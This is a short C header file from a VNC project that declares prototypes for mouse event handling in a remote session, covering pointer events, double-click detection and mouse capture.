//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: mouse.h
// $Revision: 186 $
// $Date: 2014-07-04 19:05:58 +0400 (Пт, 04 июл 2014) $
// description: 
//	mouse event handling

#ifndef __MOUSE_H_
#define __MOUSE_H_

VOID 
	MouseEventXP(
		PVNC_SESSION pSession,
		HWND hWnd,
		HWND hParent,
		PWINDOWINFO wiInfo,
		WORD wHitTest,
		DWORD uMsg,
		DWORD ncMessage,
		LPARAM dwClientCursorPos,
		LPARAM dwScreenCursorPos
		);

DWORD MouseCheckForDoubleClick( PVNC_SESSION pSession, HWND hWnd, DWORD uMsg, LPARAM dwPoints);

HWND 
	MouseChangeCapture(
		PVNC_SESSION pSession,
		DWORD dwThreadID,
		HWND hNewWnd,
		WORD wNewArea,
		BOOL bPost
		);

VOID 
	MouseReleaseCapture(
		PVNC_SESSION pSession
		);

void OnPointerEvent(
	IN PVNC_SESSION pVncSession,
	IN ULONG buttonMask,
	IN int x,
	IN int y
	);

#endif //__MOUSE_H_